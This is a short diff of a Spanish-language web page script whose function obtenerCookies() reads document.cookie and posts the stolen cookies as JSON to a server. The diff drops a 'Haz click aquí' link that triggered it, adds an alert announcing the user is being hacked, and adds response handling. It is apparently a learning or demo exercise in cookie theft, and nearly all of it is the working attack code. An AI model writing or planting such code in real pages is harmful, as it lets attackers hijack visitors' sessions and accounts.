@@ -1,9 +1,8 @@
-<a href="javascript:obtenerCookies()">Haz click aquí</a>
-
 
 <script>
-
+    
     function obtenerCookies() {
+        alert("estas siendo hackiadu")
         const cookies = document.cookie
 
         //Enviar cookies al servidor
@@ -14,6 +13,9 @@
             },
             body: JSON.stringify({cookies})
         })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
     }
 
 </script>
